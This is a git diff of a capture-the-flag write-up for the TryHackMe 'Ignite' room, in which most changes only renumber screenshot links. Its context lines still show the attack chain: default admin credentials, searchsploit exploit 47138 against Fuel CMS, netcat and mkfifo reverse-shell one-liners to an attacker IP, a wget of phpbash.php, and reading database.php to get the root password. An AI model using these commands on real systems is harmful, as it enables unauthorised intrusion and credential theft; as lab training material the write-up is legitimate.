@@ -19,7 +19,7 @@ echo "10.10.28.158 ignite.thm" >> /etc/hosts
 nmap -sC -sV -O $ignite
 ```
 
-![](../.gitbook/assets/image%20%28431%29.png)
+![](../.gitbook/assets/image%20%28436%29.png)
 
 ## GOBUSTER
 
@@ -31,11 +31,11 @@ gobuster dir -u $ignite -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,
 
 ## HTTP
 
-![](../.gitbook/assets/image%20%28405%29.png)
+![](../.gitbook/assets/image%20%28410%29.png)
 
-![](../.gitbook/assets/image%20%28425%29.png)
+![](../.gitbook/assets/image%20%28430%29.png)
 
-![](../.gitbook/assets/image%20%28391%29.png)
+![](../.gitbook/assets/image%20%28393%29.png)
 
 {% hint style="info" %}
 login: admin
@@ -43,7 +43,7 @@ login: admin
 password: admin
 {% endhint %}
 
-![](../.gitbook/assets/image%20%28403%29.png)
+![](../.gitbook/assets/image%20%28407%29.png)
 
 ![](../.gitbook/assets/image%20%28376%29.png)
 
@@ -52,7 +52,7 @@ searchsploit Fuel
 searchsploit -p 47138
 ```
 
-![](../.gitbook/assets/image%20%28420%29.png)
+![](../.gitbook/assets/image%20%28425%29.png)
 
 ```text
 cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ignite.py
@@ -97,33 +97,33 @@ while 1:
 
 ```
 
-![](../.gitbook/assets/image%20%28381%29.png)
+![](../.gitbook/assets/image%20%28382%29.png)
 
 ```text
 nc -e /bin/sh 10.14.4.204 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.204 4444 >/tmp
 ```
 
-![](../.gitbook/assets/image%20%28399%29.png)
+![](../.gitbook/assets/image%20%28403%29.png)
 
 ```text
 cmd:bash shell.sh
 ```
 
-![](../.gitbook/assets/image%20%28418%29.png)
+![](../.gitbook/assets/image%20%28423%29.png)
 
 ```text
 python3 ignite.py
 wget http://10.14.4.204:8000/phpbash.php
 ```
 
-![](../.gitbook/assets/image%20%28395%29.png)
+![](../.gitbook/assets/image%20%28399%29.png)
 
-![](../.gitbook/assets/image%20%28409%29.png)
+![](../.gitbook/assets/image%20%28414%29.png)
 
-![](../.gitbook/assets/image%20%28385%29.png)
+![](../.gitbook/assets/image%20%28387%29.png)
 
-![](../.gitbook/assets/image%20%28413%29.png)
+![](../.gitbook/assets/image%20%28418%29.png)
 
 ### User.txt
 
@@ -135,13 +135,13 @@ wget http://10.14.4.204:8000/phpbash.php
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-![](../.gitbook/assets/image%20%28408%29.png)
+![](../.gitbook/assets/image%20%28413%29.png)
 
 ```text
  cat /var/www/html/fuel/application/config/database.php
 ```
 
-![](../.gitbook/assets/image%20%28421%29.png)
+![](../.gitbook/assets/image%20%28426%29.png)
 
 ```text
 su -
@@ -149,7 +149,7 @@ password: mememe
 cat /root/root.txt
 ```
 
-![](../.gitbook/assets/image%20%28404%29.png)
+![](../.gitbook/assets/image%20%28409%29.png)
 
 ### Root.txt
 
